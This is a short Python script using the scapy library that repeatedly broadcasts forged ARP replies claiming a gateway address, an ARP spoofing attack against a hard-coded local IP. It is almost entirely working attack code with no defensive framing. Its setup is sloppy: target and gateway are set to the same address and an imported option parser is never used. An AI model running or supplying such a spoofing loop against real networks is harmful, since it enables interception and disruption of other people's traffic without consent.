from optparse import OptionParser
from scapy.all import *

def arp_spoof(target, getway):
    while True:
        try:
            pkt = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=target, psrc=getway)
            sendp(pkt)
            print('[*] Target:[' + target + '] Getway:[' + getway + '].')
            time.sleep(0.7)
        except KeyboardInterrupt:
            print('[-]stop by user')
            break


target = '192.168.0.105'
getway = '192.168.0.105'
arp_spoof(target, getway)
